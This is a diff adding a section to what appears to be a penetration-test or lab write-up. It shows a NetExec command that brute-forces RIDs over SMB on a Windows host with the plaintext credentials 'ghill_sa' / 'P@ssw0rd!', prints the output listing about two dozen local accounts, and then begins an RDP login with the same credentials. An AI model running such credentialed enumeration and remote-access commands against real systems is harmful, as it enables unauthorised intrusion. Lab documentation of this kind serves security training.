@@ -340,6 +340,39 @@ SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  Share           READ,WRITE
 ```
 This user has a lot of access on SMB here
 
+```python
+nxc smb EC2AMAZ-NS87CNK.hsm.local -u 'ghill_sa' -p 'P@ssw0rd!' --local-auth --rid-brute
+SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  [*] Windows 11 / Server 2025 Build 26100 x64 (name:EC2AMAZ-NS87CNK) (domain:EC2AMAZ-NS87CNK) (signing:False) (SMBv1:None)
+SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  [+] EC2AMAZ-NS87CNK\ghill_sa:P@ssw0rd! 
+SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  500: EC2AMAZ-NS87CNK\Administrator (SidTypeUser)
+SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  501: EC2AMAZ-NS87CNK\Guest (SidTypeUser)
+SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  503: EC2AMAZ-NS87CNK\DefaultAccount (SidTypeUser)
+SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  504: EC2AMAZ-NS87CNK\WDAGUtilityAccount (SidTypeUser)
+SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  513: EC2AMAZ-NS87CNK\None (SidTypeGroup)
+SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  1000: EC2AMAZ-NS87CNK\ghill_sa (SidTypeUser)
+SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  1001: EC2AMAZ-NS87CNK\fin_user1 (SidTypeUser)
+SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  1002: EC2AMAZ-NS87CNK\hr_admin (SidTypeUser)
+SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  1003: EC2AMAZ-NS87CNK\proj_mgr (SidTypeUser)
+SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  1004: EC2AMAZ-NS87CNK\db_readonly (SidTypeUser)
+SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  1005: EC2AMAZ-NS87CNK\audit_user (SidTypeUser)
+SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  1006: EC2AMAZ-NS87CNK\payroll_clerk (SidTypeUser)
+SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  1007: EC2AMAZ-NS87CNK\vpn_user (SidTypeUser)
+SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  1008: EC2AMAZ-NS87CNK\intranet_admin (SidTypeUser)
+SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  1009: EC2AMAZ-NS87CNK\inv_user (SidTypeUser)
+SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  1010: EC2AMAZ-NS87CNK\training_user (SidTypeUser)
+SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  1011: EC2AMAZ-NS87CNK\devops_user (SidTypeUser)
+SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  1012: EC2AMAZ-NS87CNK\support_staff (SidTypeUser)
+SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  1013: EC2AMAZ-NS87CNK\mktg_user (SidTypeUser)
+SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  1014: EC2AMAZ-NS87CNK\sales_rep (SidTypeUser)
+SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  1015: EC2AMAZ-NS87CNK\legal_user (SidTypeUser)
+SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  1016: EC2AMAZ-NS87CNK\ops_mgr (SidTypeUser)
+SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  1017: EC2AMAZ-NS87CNK\eng_user (SidTypeUser)
+SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  1018: EC2AMAZ-NS87CNK\procure_user (SidTypeUser)
+SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  1019: EC2AMAZ-NS87CNK\facilities_user (SidTypeUser)
+SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  1020: EC2AMAZ-NS87CNK\research_user (SidTypeUser)
+SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  1021: EC2AMAZ-NS87CNK\bbarkinson (SidTypeUser)
+```
+
 ## RDP access on the windows workstation as `ghill_sa`
 ```python
 nxc rdp EC2AMAZ-NS87CNK.hsm.local -u 'ghill_sa' -p 'P@ssw0rd!' --local-auth       
